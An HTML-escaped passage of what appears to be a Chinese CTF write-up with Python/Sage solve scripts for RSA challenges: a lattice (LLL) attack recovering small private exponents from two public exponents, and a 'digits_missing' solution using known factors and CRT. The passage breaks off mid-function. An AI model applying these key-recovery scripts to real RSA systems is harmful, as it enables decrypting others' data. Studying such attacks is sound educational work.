&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;e1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;e2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;146909924775777545824125517620214432622747621336824079421034301103629039466278879970055167808022739191107404040533998083148999374814673815811700861183666902780211467579162513402284885468509497173923312288517762537710685279334418218434239027287721913878857488858370213558290629714369437407772388155553108200163&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;115438050647632891775942222426836609647233560975189459023903698975771968885651962350811446729447308791250106017608721971839646737217571069312136094548245526295433224742092456687558361490026944153234227613733080447542300903055383052411559869065719789087584331775863089548946206039897996352433427474819495059230&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;m1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
 
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;autoflag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;m2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;B2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;matrix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]])&lt;/span&gt;
 
    &lt;span class=&#34;n&#34;&gt;D2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;matrix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]])&lt;/span&gt;
 
    &lt;span class=&#34;n&#34;&gt;M&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;B2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;D2&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# k1k2, k2d1, k1d2, d1d2&lt;/span&gt;
 
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vec&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;M&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LLL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;b1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vec&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;x2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Matrix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;M&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inverse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;d1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GCD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;d2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GCD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d1&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
            &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.3334&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.3570&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.0001&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;autoflag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;digits_missing&#34;&gt;digits_missing&lt;/h3&gt;
&lt;p&gt;分段解flag，最开始可以直接解传到leak函数里的c，通过已知的p,q，直接解c4，得到&lt;code&gt;flag[1] + flag[2]&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;91995782648980010847427739993217486026162499349605746023085733950130331287970901582164575965127425637201059093005775243323253033284087100922267082650658959030428900175654644688492357085409246823740850913373272701143044152106592667697815257823931523933665000651956390275184280406451020398039989430172569966888&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;flag12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inverse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 1b1e4c40&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后可以利用CRT求出d，得到padding，由于不知道e，所以需要枚举一下。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;functools&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;reduce&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;gmpy2&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4634673191749715344785371257538762101853031598311319863390489299958637062425141842768415934848075692534267896154614889702109236564561535721415087927569509&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;dq&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2784697141013150647927285038744181880232562395909713238360955579919897480173610712938239225733208967421091494647565583041208257260929211079467472399900897&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;18651280944551604311574513905924240808170858244682968806319904706985057531598471703952601755416438724112982474074553590239198586111314171935361177438127669603910558881488636283078776442128635151084339480382293790405590179460228017768072311976510633046745233628899455474429389344003169695798357039738211025666&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;egcd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;egcd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;crt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;m1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lcm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;m2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
